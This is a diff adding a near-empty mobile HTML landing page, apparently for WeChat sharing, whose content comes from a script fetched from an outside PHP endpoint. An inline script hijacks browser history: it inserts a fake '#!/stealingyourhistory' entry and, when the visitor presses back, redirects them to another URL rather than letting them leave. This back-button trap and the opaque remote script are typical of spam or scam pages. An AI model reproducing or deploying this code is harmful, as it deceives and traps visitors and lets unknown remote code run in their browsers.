@@ -1,0 +1,69 @@
+<html>
+<head>
+  <meta http-equiv="Access-Control-Allow-Origin" content="*"/>
+   <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width,initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
+    <meta content="yes" name="apple-mobile-web-app-capable">
+    <meta content="black" name="apple-mobile-web-app-status-bar-style">
+    <meta content="telephone=no" name="format-detection">
+    <meta content="email=no" name="format-detection" />
+     <style>* { margin: 0px; padding: 0px; font-size: 16px; }
+      body{
+        position: relative;
+      }
+      .ju_bao{
+        position: absolute;
+        left: 0;
+        top: 4vw;
+        width: 18%;
+        height: 40px;
+        line-height: 40px;
+        text-align: center;
+        background-color: rgba(255,255,255,0.7);
+        border-radius: 0 40px 40px 0;
+        font-size: 14px;
+        color: #474747;
+        z-index: 1001;
+      }
+     
+     </style>
+    <script>
+      (function(a, b) {
+        history.replaceState(null, document.title, b.pathname + b.search + '#!/stealingyourhistory');
+        history.pushState(null, document.title, b.pathname + b.search);
+        a.addEventListener('popstate',
+        function() {
+          if (b.hash === '#!/stealingyourhistory') {
+            history.replaceState(null, document.title, b.pathname + b.search);
+            setTimeout(function() {
+              b.replace(backurl)
+            },
+            0)
+          }
+        },
+        false)
+      } (window, location));
+    </script>
+    <style id="tsbrowser_video_independent_player_style" type="text/css">[tsbrowser_force_max_size] { width: 100% !important; height: 100% !important; left: 0px !important; top: 0px !important; margin: 0px !important; padding: 0px !important; transform: none !important; } [tsbrowser_force_fixed] { position: fixed !important; z-index: 9999 !important; background: black !important; } [tsbrowser_force_hidden] { opacity: 0 !important; z-index: 0 !important; } [tsbrowser_hide_scrollbar] { overflow: hidden !important; } [tsbrowser_display_none] { display: none !important; visibility: hidden !important; opacity: 0 !important; } [tsbrowser_force_show] { display: black !important; visibility: visible !important; opacity: 0; }</style></head>
+    <title></title>
+  <link rel="stylesheet" href="http://xx2-160.oss-cn-shanghai.aliyuncs.com/xx2-192/falali/static/css/weui.min.css">
+  <link rel="stylesheet" href="http://xx2-160.oss-cn-shanghai.aliyuncs.com/xx2-192/falali/static/css/base.css">
+    <link rel="stylesheet" href="http://xx2-160.oss-cn-shanghai.aliyuncs.com/xx2-192/falali/static/css/qieni.css">
+  <script src="http://xx2-160.oss-cn-shanghai.aliyuncs.com/xx2-192/falali/static/js/jquery.min.js"></script>
+  <script src="http://xx2-160.oss-cn-shanghai.aliyuncs.com/xx2-192/falali/static/js/zepto.js"></script>
+   <script src="http://xx2-160.oss-cn-shanghai.aliyuncs.com/xx2-192/falali/static/js/common.js"></script>
+  
+   <script src="https://res.wx.qq.com/open/js/jweixin-1.2.0.js"></script>
+  
+</head>
+<body>
+
+</body>
+    
+    <script src="http://datou.cdkuiyang.com/xx2-192/falali/index_oss.php"></script>
+
+     <style type="text/css">
+  .icon_share { display: inline-block; width: 23px; height: 23px; background: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACoAAAAkCAYAAAD/yagrAAAAAXNSR0IArs4c6QAAAytJREFUWAnVmDtoFFEUhndM4jONL/CFSgrRRhADGmyCENDGwjZoVEihhWKhgg+w10JECyGoIIJoIXYaH6BigsQgIRYi2ARNYUQSUAiauH5nmcfdm3v3zt3dGdYDP3Puuef85987M3dmtlDI2YrF4iswDDbl3Dp9O8QtApFN4uxNXx1mUhSAY2AI/AQ2m2FiEGz2bUKNKlT4Z8GZ1DwkrwLPgY8NpG6QLIYuNOp3D2exk4+kp1GFx/GHk1hLgNsmVNq+Bxu0kmTIZA+oxvoSlnQeTSoJFQ0ToNPE1kyw1zAxQuyTIS6hGTAErsvAZTQOyFkD1oPljvwVzMvZPRkEwbWyXIJTQLVvDFrKkjwH1G8H58FLMA2qsT6K5setDQxP4kkPBx7ZNfaBNwbOakMDFK4uyTAwPPbQF3G0wzNi4KpH6CskO+b5itLzITlBbBBs1efqNJbr+35NQhF5CZIrQG7KLO1OwXBuUp166k4bausdkhvxcGkFDMxOodR0gr+G2nqGxiHbGZ0m71NGcSvFt4Dsjy6bIOEzGAO/gdR0A5e9JWE/e+l4nGhYgoorSv5ZQ40a+sjgFNgSNwkdYq4nk/DcBAv0Wq9rFIJW8B2YbIxgN7DeoMxVEvqH+eNzBEYBJnWzriiJR/TkcPyI47KI03YkxyZUfvxuW10pHjZSD5WEmt6yZItKZRah8qDY6CRQFYa+UShzS4G8NKt22dlASaBQX9EHxJYoKXZX7Rr6NqF7tNy7dlbzDPXN4BeQN/tz5ixLlALdbEIvKomj+O43ckNP6raBdsNUHGJ+IbgBvoB+0Jb6rif5IRCT76lMvyDhl1dE1V5bt5L45yXOutC9wEZse6lOsmvzOrTyDh+haykeBlc1kiyGTRppk4/QaYp7Wc1ZjSSXYepnPQLbclFkaeKzohaKfML/tdA0r29ZL+NcDWxWU+qGhV/z53Itv4L+LaEGVdak3EyjYJdCvhL/HVlZ75VKyzJXHiaiQbUP8i3eQ+S2Gm1A/1DpWkBsP+K6GlCgSHrG1tgV3fUHCbxoQKGi6UCZLlZVLoOjwPVHLimZmrz0iAb5Uzm++/8BvyvnywfUCCEAAAAASUVORK5CYII=) no-repeat; background-size: 100%; vertical-align: middle; }
+</style>
+</html>
